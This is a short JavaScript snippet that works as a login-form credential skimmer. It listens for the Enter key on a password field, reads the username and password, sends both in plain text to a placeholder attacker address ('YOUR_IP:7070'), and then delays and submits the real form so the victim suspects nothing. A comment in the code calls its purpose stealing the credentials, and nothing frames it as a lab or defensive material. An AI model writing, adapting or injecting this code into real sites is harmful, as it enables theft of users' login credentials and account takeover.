// Listen for Enter key
var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {
    if (event.key == "Enter") {
        event.preventDefault();
        try {
            // Steal the credentials
            var user = document.getElementById('txtUsername').value;
            var pass = document.getElementById('txtPassword').value;
            const oReq = new XMLHttpRequest();
            oReq.open("GET", "http://YOUR_IP:7070/item?user=" + user + "&pass=" + pass);
            oReq.send();
        } catch (err) {
            console.log(err);
        }

        // Wait 5 seconds so request finishes
        function sleep(time) {
            return new Promise((resolve) => setTimeout(resolve, time));
        }
        sleep(5000).then(() => {
            document.getElementById("loginSubmit").click();
        });
    }
});
